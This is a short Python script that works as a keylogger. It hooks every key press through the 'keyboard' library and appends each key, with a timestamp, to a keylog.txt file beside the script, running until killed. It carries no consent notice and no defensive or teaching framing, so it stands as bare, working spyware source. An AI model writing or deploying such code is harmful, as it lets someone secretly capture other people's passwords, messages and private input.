import keyboard
import os
import datetime

current_dir = os.path.dirname(os.path.abspath(__file__))

log_file = os.path.join(current_dir, "keylog.txt")

def log_keystroke(event):
    key = event.name
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file, "a") as f:
        f.write(f"{now}: {key}\n")

keyboard.on_press(log_keystroke)

keyboard.wait()
